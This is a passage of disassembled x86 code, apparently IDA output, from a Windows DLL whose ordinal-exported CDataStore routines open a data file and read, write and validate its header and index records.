		call	Ordinal236
		mov	[edi+14h], eax
		push	offset aCdatastoreRe_2 ; "CDataStore::ReadIndex() : m_File.Read()"...
		jmp	loc_6AF40991
; ---------------------------------------------------------------------------

loc_6AF408ED:				; CODE XREF: Ordinal611+ACj
		push	0Ah
		pop	ecx
		mov	esi, ebx
		lea	edi, [ebp+var_30]
		rep movsd
		lea	eax, [ebp+var_30]
		push	28h
		xor	edi, edi
		push	eax
		mov	[ebp+var_C], edi
		call	Ordinal581
		cmp	[ebx+24h], eax
		pop	ecx
		pop	ecx
		jz	short loc_6AF40915
		push	offset aCdatastoreRe_3 ; "CDataStore::ReadIndex() : Index.m_dwHea"...
		jmp	short loc_6AF40991
; ---------------------------------------------------------------------------

loc_6AF40915:				; CODE XREF: Ordinal611+E1j
		mov	ecx, [ebx]
		mov	eax, [ebp+var_4]
		cmp	ecx, [eax+0ACh]
		jnz	short loc_6AF40985
		mov	ecx, [ebx+4]
		cmp	ecx, [eax+0B0h]
		jnz	short loc_6AF40985
		mov	eax, [ebx+8]
		cmp	eax, [ebp+lDistanceToMove]
		mov	esi, [ebx+0Ch]
		mov	[ebp+var_8], eax
		jnz	short loc_6AF4097E
		cmp	esi, [ebp+arg_4]
		jnz	short loc_6AF4097E
		mov	ecx, [ebx+18h]
		cmp	[ebx+1Ch], ecx
		ja	short loc_6AF4097E
		mov	edx, [ebp+arg_8]
		xor	eax, eax
		add	ecx, [ebp+lDistanceToMove]
		adc	eax, [ebp+arg_4]
		add	ecx, 28h
		adc	eax, edi
		cmp	eax, [edx+4]
		ja	short loc_6AF4097E
		jb	short loc_6AF40963
		cmp	ecx, [edx]
		ja	short loc_6AF4097E

loc_6AF40963:				; CODE XREF: Ordinal611+132j
		mov	eax, [ebx+10h]
		mov	ebx, [ebx+14h]
		add	eax, 28h
		adc	ebx, edi
		cmp	ebx, esi
		ja	short loc_6AF4097E
		jb	short loc_6AF40979
		cmp	eax, [ebp+var_8]
		ja	short loc_6AF4097E

loc_6AF40979:				; CODE XREF: Ordinal611+147j
		xor	eax, eax
		inc	eax
		jmp	short loc_6AF40999
; ---------------------------------------------------------------------------

loc_6AF4097E:				; CODE XREF: Ordinal611+10Ej
					; Ordinal611+113j ...
		push	offset aCdatastoreRe_4 ; "CDataStore::ReadIndex() : Index.m_uInde"...
		jmp	short loc_6AF40991
; ---------------------------------------------------------------------------

loc_6AF40985:				; CODE XREF: Ordinal611+F5j
					; Ordinal611+100j
		push	offset aCdatastoreRe_5 ; "CDataStore::ReadIndex() : Index.m_dwSig"...
		jmp	short loc_6AF40991
; ---------------------------------------------------------------------------

loc_6AF4098C:				; CODE XREF: Ordinal611+59j
					; Ordinal611+63j ...
		push	offset aCdatastoreRe_6 ; "CDataStore::ReadIndex() : uFileSize <	s"...

loc_6AF40991:				; CODE XREF: Ordinal611+45j
					; Ordinal611+BDj ...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax

loc_6AF40999:				; CODE XREF: Ordinal611+151j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	10h
Ordinal611	endp

; Exported entry 612.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal612
Ordinal612	proc near		; CODE XREF: Ordinal433+1BEp
					; Ordinal433+2DAp ...

Buffer		= dword	ptr -28h
var_24		= dword	ptr -24h
lDistanceToMove	= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 28h
		push	ebx
		push	esi
		mov	esi, [ebp+arg_0]
		push	edi
		mov	ebx, ecx
		mov	eax, [ebx+0ACh]
		push	0Ah
		pop	ecx
		lea	edi, [ebp+Buffer]
		rep movsd
		and	[ebp+var_4], 0
		mov	[ebp+Buffer], eax
		mov	eax, [ebx+0B0h]
		mov	[ebp+var_24], eax
		lea	eax, [ebp+Buffer]
		push	28h
		push	eax
		call	Ordinal581
		pop	ecx
		pop	ecx
		push	28h		; nNumberOfBytesToWrite
		mov	[ebp+var_4], eax
		lea	eax, [ebp+Buffer]
		push	eax		; lpBuffer
		push	[ebp+var_1C]	; int
		lea	esi, [ebx+8]
		push	[ebp+lDistanceToMove] ;	lDistanceToMove
		mov	ecx, esi
		call	Ordinal781
		test	eax, eax
		jnz	short loc_6AF40A0F
		mov	ecx, esi
		call	Ordinal236
		push	offset aCdatastoreWr_2 ; "CDataStore::WriteIndex() : m_File.Write"...
		mov	[ebx+14h], eax
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF40A12
; ---------------------------------------------------------------------------

loc_6AF40A0F:				; CODE XREF: Ordinal612+54j
		xor	eax, eax
		inc	eax

loc_6AF40A12:				; CODE XREF: Ordinal612+6Dj
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	4
Ordinal612	endp

; Exported entry 613.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal613
Ordinal613	proc near		; CODE XREF: Ordinal587+10Fp
					; Ordinal587+1A5p ...

Buffer		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_8		= dword	ptr -8
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 20h
		push	ebx
		push	esi
		mov	esi, [ebp+arg_0]
		push	edi
		mov	ebx, ecx
		mov	eax, [ebx+0A4h]
		push	8
		pop	ecx
		lea	edi, [ebp+Buffer]
		rep movsd
		mov	[ebp+Buffer], eax
		mov	eax, [ebx+0A8h]
		mov	[ebp+var_1C], eax
		lea	eax, [ebp+Buffer]
		push	20h
		xor	edi, edi
		push	eax
		mov	[ebp+var_8], edi
		call	Ordinal581
		pop	ecx
		pop	ecx
		push	20h		; nNumberOfBytesToWrite
		mov	[ebp+var_8], eax
		lea	eax, [ebp+Buffer]
		push	eax		; lpBuffer
		push	edi		; int
		lea	esi, [ebx+8]
		push	edi		; lDistanceToMove
		mov	ecx, esi
		call	Ordinal781
		test	eax, eax
		jnz	short loc_6AF40A85
		mov	ecx, esi
		call	Ordinal236
		push	offset aCdatastoreWrit ; "CDataStore::WriteHeader() : m_File.Writ"...
		mov	[ebx+14h], eax
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF40A88
; ---------------------------------------------------------------------------

loc_6AF40A85:				; CODE XREF: Ordinal613+51j
		xor	eax, eax
		inc	eax

loc_6AF40A88:				; CODE XREF: Ordinal613+6Aj
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	4
Ordinal613	endp

; Exported entry 614.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal614(int,	void *lpBuffer)
		public Ordinal614
Ordinal614	proc near		; CODE XREF: Ordinal587+18Bp
					; Ordinal587+1D9p ...

var_24		= byte ptr -24h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
lpBuffer	= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 24h
		push	ebx
		mov	ebx, [ebp+lpBuffer]
		push	esi
		push	edi
		push	20h		; Size
		mov	edi, ecx
		push	0		; Val
		push	ebx		; Dst
		mov	[ebp+var_4], edi
		call	memset
		mov	esi, [ebp+arg_0]
		mov	eax, [esi]
		add	esp, 0Ch
		or	eax, [esi+4]
		jnz	short loc_6AF40AD9
		lea	ecx, [edi+8]
		push	esi
		call	Ordinal787
		test	eax, eax
		jnz	short loc_6AF40AD9
		lea	ecx, [edi+8]
		call	Ordinal236
		mov	[edi+14h], eax
		push	offset aCdatastoreRe_7 ; "CDataStore::ReadHeader() : m_File.GetLe"...
		jmp	loc_6AF40B7D
; ---------------------------------------------------------------------------

loc_6AF40AD9:				; CODE XREF: Ordinal614+26j
					; Ordinal614+33j
		xor	eax, eax
		cmp	[esi+4], eax
		ja	short loc_6AF40AF1
		jb	short loc_6AF40AE7
		cmp	dword ptr [esi], 20h
		jnb	short loc_6AF40AF1

loc_6AF40AE7:				; CODE XREF: Ordinal614+51j
		push	offset aCdatastoreRe_8 ; "CDataStore::ReadHeader() : uFileSize < "...
		jmp	loc_6AF40B7D
; ---------------------------------------------------------------------------

loc_6AF40AF1:				; CODE XREF: Ordinal614+4Fj
					; Ordinal614+56j
		push	20h		; nNumberOfBytesToRead
		push	ebx		; lpBuffer
		push	eax		; int
		lea	esi, [edi+8]
		push	eax		; lDistanceToMove
		mov	ecx, esi
		call	Ordinal779
		test	eax, eax
		jnz	short loc_6AF40B15
		mov	ecx, esi
		call	Ordinal236
		mov	[edi+14h], eax
		push	offset aCdatastoreRead ; "CDataStore::ReadHeader() : m_File.Read("...
		jmp	short loc_6AF40B7D
; ---------------------------------------------------------------------------

loc_6AF40B15:				; CODE XREF: Ordinal614+73j
		push	8
		pop	ecx
		lea	eax, [ebp+var_24]
		mov	esi, ebx
		lea	edi, [ebp+var_24]
		push	20h
		rep movsd
		and	[ebp+var_C], 0
		push	eax
		call	Ordinal581
		cmp	[ebx+18h], eax
		pop	ecx
		pop	ecx
		jz	short loc_6AF40B3C
		push	offset aCdatastoreRe_9 ; "CDataStore::ReadHeader() : Header.m_dwH"...
		jmp	short loc_6AF40B7D
; ---------------------------------------------------------------------------

loc_6AF40B3C:				; CODE XREF: Ordinal614+A4j
		mov	ecx, [ebx]
		mov	eax, [ebp+var_4]
		cmp	ecx, [eax+0A4h]
		jnz	short loc_6AF40B78
		mov	ecx, [ebx+4]
		cmp	ecx, [eax+0A8h]
		jnz	short loc_6AF40B78
		mov	eax, [ebx+8]
		mov	ebx, [ebx+0Ch]
		mov	ecx, eax
		or	ecx, ebx
		jz	short loc_6AF40B73
		mov	ecx, [ebp+arg_0]
		cmp	eax, [ecx]
		jnz	short loc_6AF40B6C
		cmp	ebx, [ecx+4]
		jz	short loc_6AF40B73

loc_6AF40B6C:				; CODE XREF: Ordinal614+D6j
		push	offset aCdatastoreR_10 ; "CDataStore::ReadHeader() : Header.m_uFi"...
		jmp	short loc_6AF40B7D
; ---------------------------------------------------------------------------

loc_6AF40B73:				; CODE XREF: Ordinal614+CFj
					; Ordinal614+DBj
		xor	eax, eax
		inc	eax
		jmp	short loc_6AF40B85
; ---------------------------------------------------------------------------

loc_6AF40B78:				; CODE XREF: Ordinal614+B8j
					; Ordinal614+C3j
		push	offset aCdatastoreR_11 ; "CDataStore::ReadHeader() : Header.m_dwS"...

loc_6AF40B7D:				; CODE XREF: Ordinal614+45j
					; Ordinal614+5Dj ...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax

loc_6AF40B85:				; CODE XREF: Ordinal614+E7j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	8
Ordinal614	endp

; Exported entry 617.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal617(int,	void *lpBuffer)
		public Ordinal617
Ordinal617	proc near		; CODE XREF: Ordinal622+7Fp
					; Ordinal607+41p ...

arg_0		= dword	ptr  4
lpBuffer	= dword	ptr  8

		push	ebx
		push	esi
		push	edi
		push	28h		; Size
		push	0		; Val
		push	[esp+14h+lpBuffer] ; Dst
		mov	edi, ecx
		call	memset
		mov	esi, [esp+18h+arg_0]
		mov	eax, [esi]
		add	esp, 0Ch
		or	eax, [esi+4]
		jnz	short loc_6AF40BCC
		lea	ebx, [edi+8]
		push	esi
		mov	ecx, ebx
		call	Ordinal787
		test	eax, eax
		jnz	short loc_6AF40BCC
		mov	ecx, ebx
		call	Ordinal236
		mov	[edi+14h], eax
		push	offset aCdatastoreR_12 ; "CDataStore::ReadFirstIndex() : m_File.G"...
		jmp	short loc_6AF40BF4
; ---------------------------------------------------------------------------

loc_6AF40BCC:				; CODE XREF: Ordinal617+1Ej
					; Ordinal617+2Dj
		mov	eax, [edi+20h]
		add	eax, 20h
		xor	ecx, ecx
		cmp	eax, [esi]
		jnz	short loc_6AF40BDD
		cmp	ecx, [esi+4]
		jz	short loc_6AF40BFE

loc_6AF40BDD:				; CODE XREF: Ordinal617+4Aj
		push	[esp+0Ch+lpBuffer] ; lpBuffer
		push	esi		; int
		push	ecx		; int
		push	eax		; lDistanceToMove
		mov	ecx, edi
		call	Ordinal611
		test	eax, eax
		jnz	short loc_6AF40BFE
		push	offset aCdatastoreR_13 ; "CDataStore::ReadFirstIndex() : ReadInde"...

loc_6AF40BF4:				; CODE XREF: Ordinal617+3Ej
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF40C01
; ---------------------------------------------------------------------------

loc_6AF40BFE:				; CODE XREF: Ordinal617+4Fj
					; Ordinal617+61j
		xor	eax, eax
		inc	eax

loc_6AF40C01:				; CODE XREF: Ordinal617+70j
		pop	edi
		pop	esi
		pop	ebx
		retn	8
Ordinal617	endp

; Exported entry 618.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal618(int,	int, void *lpBuffer)
		public Ordinal618
Ordinal618	proc near		; CODE XREF: Ordinal622+D5p
					; Ordinal607+A8p ...

var_28		= byte ptr -28h
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_10		= dword	ptr -10h
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
lpBuffer	= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 28h
		push	ebx
		push	esi
		mov	esi, [ebp+arg_0]
		push	edi
		push	0Ah
		mov	ebx, ecx
		pop	ecx
		push	28h		; Size
		push	0		; Val
		push	[ebp+lpBuffer]	; Dst
		lea	edi, [ebp+var_28]
		rep movsd
		call	memset
		mov	esi, [ebp+arg_4]
		mov	eax, [esi]
		add	esp, 0Ch
		or	eax, [esi+4]
		jnz	short loc_6AF40C56
		lea	edi, [ebx+8]
		push	esi
		mov	ecx, edi
		call	Ordinal787
		test	eax, eax
		jnz	short loc_6AF40C56
		mov	ecx, edi
		call	Ordinal236
		mov	[ebx+14h], eax
		push	offset aCdatastoreR_14 ; "CDataStore::ReadNextIndex() :	m_File.Ge"...
		jmp	short loc_6AF40C92
; ---------------------------------------------------------------------------

loc_6AF40C56:				; CODE XREF: Ordinal618+2Dj
					; Ordinal618+3Cj
		mov	eax, [ebp+var_10]
		mov	edi, [esi]
		mov	edx, [esi+4]
		xor	ecx, ecx
		add	eax, [ebp+var_20]
		adc	ecx, [ebp+var_1C]
		add	eax, 28h
		adc	ecx, 0
		add	edi, 0FFFFFFFFh
		adc	edx, 0FFFFFFFFh
		cmp	ecx, edx
		jb	short loc_6AF40C7C
		ja	short loc_6AF40C9C
		cmp	eax, edi
		jnb	short loc_6AF40C9C

loc_6AF40C7C:				; CODE XREF: Ordinal618+6Dj
		push	[ebp+lpBuffer]	; lpBuffer
		push	esi		; int
		push	ecx		; int
		push	eax		; lDistanceToMove
		mov	ecx, ebx
		call	Ordinal611
		test	eax, eax
		jnz	short loc_6AF40C9C
		push	offset aCdatastoreR_15 ; "CDataStore::ReadNextIndex() :	ReadIndex"...

loc_6AF40C92:				; CODE XREF: Ordinal618+4Dj
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF40C9F
; ---------------------------------------------------------------------------

loc_6AF40C9C:				; CODE XREF: Ordinal618+6Fj
					; Ordinal618+73j ...
		xor	eax, eax
		inc	eax

loc_6AF40C9F:				; CODE XREF: Ordinal618+93j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	0Ch
Ordinal618	endp

; Exported entry 619.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal619(int,	int, void *lpBuffer)
		public Ordinal619
Ordinal619	proc near		; CODE XREF: Ordinal616+65p
					; Ordinal616+1A4p ...

var_28		= byte ptr -28h
lDistanceToMove	= dword	ptr -18h
var_14		= dword	ptr -14h
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
lpBuffer	= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 28h
		push	ebx
		push	esi
		mov	esi, [ebp+arg_0]
		push	edi
		push	0Ah
		mov	ebx, ecx
		pop	ecx
		push	28h		; Size
		push	0		; Val
		push	[ebp+lpBuffer]	; Dst
		lea	edi, [ebp+var_28]
		rep movsd
		call	memset
		mov	eax, [ebp+lDistanceToMove]
		add	esp, 0Ch
		or	eax, [ebp+var_14]
		jz	short loc_6AF40CF9
		push	[ebp+lpBuffer]	; lpBuffer
		mov	ecx, ebx
		push	[ebp+arg_4]	; int
		push	[ebp+var_14]	; int
		push	[ebp+lDistanceToMove] ;	lDistanceToMove
		call	Ordinal611
		test	eax, eax
		jnz	short loc_6AF40CF9
		push	offset aCdatastoreR_16 ; "CDataStore::ReadPreviousIndex() : ReadI"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF40CFC
; ---------------------------------------------------------------------------

loc_6AF40CF9:				; CODE XREF: Ordinal619+2Bj
					; Ordinal619+42j
		xor	eax, eax
		inc	eax

loc_6AF40CFC:				; CODE XREF: Ordinal619+51j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	0Ch
Ordinal619	endp

; Exported entry 621.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal621
Ordinal621	proc near		; CODE XREF: Ordinal622+68p
					; Ordinal622+115p ...
		push	58h		; Size
		add	ecx, 28h
		push	0		; Val
		push	ecx		; Dst
		call	memset
		add	esp, 0Ch
		retn
Ordinal621	endp

; Exported entry 622.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal622(int,	void *Dst)
		public Ordinal622
Ordinal622	proc near		; CODE XREF: Ordinal622+FCp
					; Ordinal620+1Ep ...

Buffer		= byte ptr -34h
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
var_1C		= dword	ptr -1Ch
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
Dst		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 34h
		push	ebx
		push	esi
		push	edi
		mov	edi, [ebp+Dst]
		push	28h		; Size
		push	0		; Val
		push	edi		; Dst
		mov	ebx, ecx
		call	memset
		lea	esi, [ebx+28h]
		add	esp, 0Ch
		cmp	dword ptr [esi], 0
		mov	[ebp+var_4], esi
		jz	short loc_6AF40D7A
		cmp	[ebp+arg_0], 0
		jz	short loc_6AF40D7A
		mov	eax, [ebx+38h]
		or	eax, [ebx+3Ch]
		jz	short loc_6AF40D72
		mov	eax, [ebx+48h]
		sub	eax, [ebx+4Ch]
		cmp	eax, 28h
		jbe	short loc_6AF40D72
		add	eax, 0FFFFFFD8h
		cmp	eax, [ebp+arg_0]
		jb	short loc_6AF40D72
		push	0Ah
		pop	ecx
		push	58h		; Size
		push	0		; Val
		push	[ebp+var_4]	; Dst
		lea	esi, [ebx+30h]
		rep movsd
		call	memset
		add	esp, 0Ch

loc_6AF40D72:				; CODE XREF: Ordinal622+32j
					; Ordinal622+3Dj ...
		xor	eax, eax
		inc	eax
		jmp	loc_6AF40E15
; ---------------------------------------------------------------------------

loc_6AF40D7A:				; CODE XREF: Ordinal622+24j
					; Ordinal622+2Aj
		mov	ecx, ebx
		call	Ordinal621
		and	[ebp+var_C], 0
		and	[ebp+var_8], 0
		lea	eax, [ebp+Buffer]
		push	eax		; lpBuffer
		lea	eax, [ebp+var_C]
		push	eax		; int
		mov	ecx, ebx
		call	Ordinal617
		test	eax, eax
		jnz	short loc_6AF40DAC
		push	offset aCdatastoreFind ; "CDataStore::FindAddIndex() : ReadFirstI"...
		call	sub_6AF3102E
		pop	ecx
		jmp	loc_6AF40E2E
; ---------------------------------------------------------------------------

loc_6AF40DAC:				; CODE XREF: Ordinal622+86j
		mov	eax, [ebp+var_2C]
		or	eax, [ebp+var_28]
		jz	short loc_6AF40DFD

loc_6AF40DB4:				; CODE XREF: Ordinal622+E4j
		mov	eax, [ebx+4Ch]
		mov	ecx, [ebx+48h]
		mov	edx, [ebp+var_1C]
		sub	ecx, eax
		sub	edx, eax
		cmp	edx, ecx
		jbe	short loc_6AF40DD0
		push	0Ah
		lea	edi, [ebx+30h]
		pop	ecx
		lea	esi, [ebp+Buffer]
		rep movsd

loc_6AF40DD0:				; CODE XREF: Ordinal622+AFj
		push	0Ah
		pop	ecx
		lea	eax, [ebp+Buffer]
		push	eax		; lpBuffer
		lea	eax, [ebp+var_C]
		push	eax		; int
		lea	esi, [ebp+Buffer]
		lea	edi, [ebx+58h]
		lea	eax, [ebp+Buffer]
		rep movsd
		push	eax		; int
		mov	ecx, ebx
		call	Ordinal618
		test	eax, eax
		jz	short loc_6AF40E1C
		mov	eax, [ebp+var_2C]
		or	eax, [ebp+var_28]
		jnz	short loc_6AF40DB4
		mov	esi, [ebp+var_4]

loc_6AF40DFD:				; CODE XREF: Ordinal622+9Ej
		xor	eax, eax
		inc	eax
		cmp	[ebp+arg_0], 0
		mov	[esi], eax
		jbe	short loc_6AF40E15
		push	[ebp+Dst]	; Dst
		mov	ecx, ebx
		push	[ebp+arg_0]	; int
		call	Ordinal622

loc_6AF40E15:				; CODE XREF: Ordinal622+61j
					; Ordinal622+F2j ...
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	8
; ---------------------------------------------------------------------------

loc_6AF40E1C:				; CODE XREF: Ordinal622+DCj
		push	offset aCdatastoreFi_0 ; "CDataStore::FindAddIndex() : ReadNextIn"...
		call	sub_6AF3102E
		pop	ecx
		mov	ecx, ebx
		call	Ordinal621

loc_6AF40E2E:				; CODE XREF: Ordinal622+93j
		xor	eax, eax
		jmp	short loc_6AF40E15
Ordinal622	endp

; Exported entry 587.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame fpd=0C4h

; int __stdcall	Ordinal587(LPCSTR Args,	DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES	lpSecurityAttributes, DWORD nNumberOfBytesToWrite, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile, int)
		public Ordinal587
Ordinal587	proc near		; CODE XREF: Ordinal427+22p
					; Ordinal586+24p
					; DATA XREF: ...

var_144		= byte ptr -144h
Dst		= byte ptr -138h
var_130		= dword	ptr -130h
var_12C		= dword	ptr -12Ch
var_128		= dword	ptr -128h
var_124		= dword	ptr -124h
var_118		= dword	ptr -118h
var_114		= dword	ptr -114h
lDistanceToMove	= dword	ptr -110h
var_10C		= dword	ptr -10Ch
var_108		= dword	ptr -108h
Buffer		= byte ptr -104h
var_4		= dword	ptr -4
Args		= dword	ptr  8
dwDesiredAccess	= dword	ptr  0Ch
dwShareMode	= dword	ptr  10h
lpSecurityAttributes= dword ptr	 14h
nNumberOfBytesToWrite= dword ptr  18h
dwFlagsAndAttributes= dword ptr	 1Ch
hTemplateFile	= dword	ptr  20h
arg_1C		= dword	ptr  24h

		push	ebp
		lea	ebp, [esp-0C4h]
		sub	esp, 144h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	esi, ecx
		xor	ebx, ebx
		push	ebx
		mov	[ebp+0C4h+var_4], eax
		push	0FFFFFFFFh
		lea	eax, [esi+84h]
		push	eax
		lea	ecx, [ebp+0C4h+var_144]
		call	Ordinal1228
		push	[ebp+0C4h+hTemplateFile] ; hTemplateFile
		lea	edi, [esi+8]
		push	[ebp+0C4h+dwFlagsAndAttributes]	; dwFlagsAndAttributes
		mov	ecx, edi
		push	[ebp+0C4h+nNumberOfBytesToWrite] ; dwCreationDisposition
		mov	[ebp+0C4h+var_108], edi
		push	[ebp+0C4h+lpSecurityAttributes]	; lpSecurityAttributes
		push	[ebp+0C4h+dwShareMode] ; dwShareMode
		push	[ebp+0C4h+dwDesiredAccess] ; dwDesiredAccess
		push	[ebp+0C4h+Args]	; Args
		call	Ordinal773
		test	eax, eax
		jnz	short loc_6AF40EBB
		mov	ecx, edi
		call	Ordinal236
		push	offset aCdatastoreOpen ; "CDataStore::Open() : m_File.Open() ==	F"...
		mov	[esi+14h], eax
		call	sub_6AF3102E
		pop	ecx

loc_6AF40EB4:				; CODE XREF: Ordinal587+1C0j
		xor	esi, esi
		jmp	loc_6AF4104D
; ---------------------------------------------------------------------------

loc_6AF40EBB:				; CODE XREF: Ordinal587+6Bj
		mov	eax, [ebp+0C4h+nNumberOfBytesToWrite]
		dec	eax
		jz	short loc_6AF40EE9
		dec	eax
		jz	short loc_6AF40EE9
		dec	eax
		jz	short loc_6AF40EEC
		dec	eax
		jz	short loc_6AF40EDA
		dec	eax
		jz	short loc_6AF40EE9
		push	offset aCdatastoreOp_0 ; "CDataStore::Open() : switch(Default)\n"
		jmp	loc_6AF40FE5
; ---------------------------------------------------------------------------

loc_6AF40EDA:				; CODE XREF: Ordinal587+99j
		call	ds:GetLastError
		mov	ebx, eax
		neg	ebx
		sbb	ebx, ebx
		inc	ebx
		jmp	short loc_6AF40EEC
; ---------------------------------------------------------------------------

loc_6AF40EE9:				; CODE XREF: Ordinal587+90j
					; Ordinal587+93j ...
		xor	ebx, ebx
		inc	ebx

loc_6AF40EEC:				; CODE XREF: Ordinal587+96j
					; Ordinal587+B5j
		and	[ebp+0C4h+var_118], 0
		and	[ebp+0C4h+var_114], 0
		lea	eax, [ebp+0C4h+var_118]
		push	eax
		mov	ecx, edi
		call	Ordinal787
		test	eax, eax
		jnz	short loc_6AF40F17
		mov	ecx, edi
		call	Ordinal236
		mov	[esi+14h], eax
		push	offset aCdatastoreOp_1 ; "CDataStore::Open() : m_File.GetLength()"...
		jmp	loc_6AF40FE5
; ---------------------------------------------------------------------------

loc_6AF40F17:				; CODE XREF: Ordinal587+CFj
		push	20h		; Size
		lea	eax, [ebp+0C4h+Dst]
		push	0		; Val
		push	eax		; Dst
		call	memset
		add	esp, 0Ch
		test	ebx, ebx
		lea	eax, [ebp+0C4h+Dst]
		mov	ecx, esi
		push	eax
		jz	loc_6AF41007
		mov	ebx, [ebp+0C4h+arg_1C]
		mov	[ebp+0C4h+var_128], ebx
		mov	[esi+20h], ebx
		call	Ordinal613
		test	eax, eax
		jz	loc_6AF40FE0
		mov	edi, 100h
		push	edi		; Size
		lea	eax, [ebp+0C4h+Buffer]
		push	0		; Val
		push	eax		; Dst
		call	memset
		and	[ebp+0C4h+var_10C], 0
		add	esp, 0Ch
		test	ebx, ebx
		mov	[ebp+0C4h+nNumberOfBytesToWrite], ebx
		mov	[ebp+0C4h+lDistanceToMove], 20h
		jbe	short loc_6AF40FB0

loc_6AF40F77:				; CODE XREF: Ordinal587+17Cj
		mov	ebx, [ebp+0C4h+nNumberOfBytesToWrite]
		cmp	ebx, edi
		jbe	short loc_6AF40F83
		mov	ebx, edi

loc_6AF40F83:				; CODE XREF: Ordinal587+14Dj
		mov	ecx, [ebp+0C4h+var_108]
		push	ebx		; nNumberOfBytesToWrite
		lea	eax, [ebp+0C4h+Buffer]
		push	eax		; lpBuffer
		push	[ebp+0C4h+var_10C] ; int
		push	[ebp+0C4h+lDistanceToMove] ; lDistanceToMove
		call	Ordinal781
		test	eax, eax
		jz	short loc_6AF40FF7
		sub	[ebp+0C4h+nNumberOfBytesToWrite], ebx
		add	[ebp+0C4h+lDistanceToMove], ebx
		adc	[ebp+0C4h+var_10C], 0
		cmp	[ebp+0C4h+nNumberOfBytesToWrite], 0
		ja	short loc_6AF40F77

loc_6AF40FB0:				; CODE XREF: Ordinal587+143j
		mov	edi, [ebp+0C4h+var_108]

loc_6AF40FB3:				; CODE XREF: Ordinal587+20Bj
		lea	eax, [ebp+0C4h+Dst]
		push	eax		; lpBuffer
		lea	eax, [ebp+0C4h+var_118]
		push	eax		; int
		mov	ecx, esi
		call	Ordinal614
		test	eax, eax
		jz	short loc_6AF41014
		xor	ebx, ebx
		lea	eax, [ebp+0C4h+Dst]
		push	eax
		mov	ecx, esi
		mov	[ebp+0C4h+var_130], ebx
		mov	[ebp+0C4h+var_12C], ebx
		mov	[ebp+0C4h+var_124], ebx
		call	Ordinal613
		test	eax, eax
		jnz	short loc_6AF4104A

loc_6AF40FE0:				; CODE XREF: Ordinal587+116j
		push	offset aCdatastoreOp_2 ; "CDataStore::Open() : WriteHeader() ==	F"...

loc_6AF40FE5:				; CODE XREF: Ordinal587+A3j
					; Ordinal587+E0j ...
		call	sub_6AF3102E
		pop	ecx
		mov	ecx, edi

loc_6AF40FED:				; CODE XREF: Ordinal587+1D3j
		call	Ordinal774
		jmp	loc_6AF40EB4
; ---------------------------------------------------------------------------

loc_6AF40FF7:				; CODE XREF: Ordinal587+166j
		push	offset aCdatastoreOp_3 ; "CDataStore::Open() : m_File.Write() == "...
		call	sub_6AF3102E
		pop	ecx
		mov	ecx, [ebp+0C4h+var_108]
		jmp	short loc_6AF40FED
; ---------------------------------------------------------------------------

loc_6AF41007:				; CODE XREF: Ordinal587+FDj
		lea	eax, [ebp+0C4h+var_118]
		push	eax		; int
		call	Ordinal614
		test	eax, eax
		jnz	short loc_6AF4101B

loc_6AF41014:				; CODE XREF: Ordinal587+192j
		push	offset aCdatastoreOp_4 ; "CDataStore::Open() : ReadHeader() == FA"...
		jmp	short loc_6AF40FE5
; ---------------------------------------------------------------------------

loc_6AF4101B:				; CODE XREF: Ordinal587+1E0j
		mov	eax, [ebp+0C4h+var_128]
		push	4		; Size
		mov	[esi+20h], eax
		lea	eax, [esi+80h]
		push	0		; Val
		push	eax		; Dst
		call	memset
		mov	eax, [esi]
		add	esp, 0Ch
		mov	ecx, esi
		call	dword ptr [eax+4]
		test	eax, eax
		jnz	loc_6AF40FB3
		push	offset aCdatastoreOp_5 ; "CDataStore::Open() : ValidateFile() == "...
		jmp	short loc_6AF40FE5
; ---------------------------------------------------------------------------

loc_6AF4104A:				; CODE XREF: Ordinal587+1ACj
		xor	esi, esi
		inc	esi

loc_6AF4104D:				; CODE XREF: Ordinal587+84j
